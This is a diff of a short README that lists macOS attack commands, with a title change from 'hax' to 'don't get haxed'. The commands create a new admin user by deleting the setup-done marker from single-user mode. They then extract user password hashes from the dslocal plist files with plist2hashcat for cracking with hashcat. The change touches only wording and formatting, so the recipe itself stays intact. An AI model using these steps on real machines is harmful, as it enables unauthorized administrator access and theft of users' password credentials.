@@ -1,9 +1,9 @@
-# hax
-view in raw to get commands right cuz github doesn't give a crap about what goes on what line:)
+# don't get haxed
+view in raw to get commands right cuz github doesn't give a crap about what goes on what line :)
 # new admin user in single user mode
 mount -uw /
 rm /var/db/AppleSetupDone
-reboot
+*reboot*
 # execute in terminal with root access
 cd path/to/hashcat
 sudo ./plist2hashcat.py /var/db/dslocal/nodes/default/users/*USER*.plist
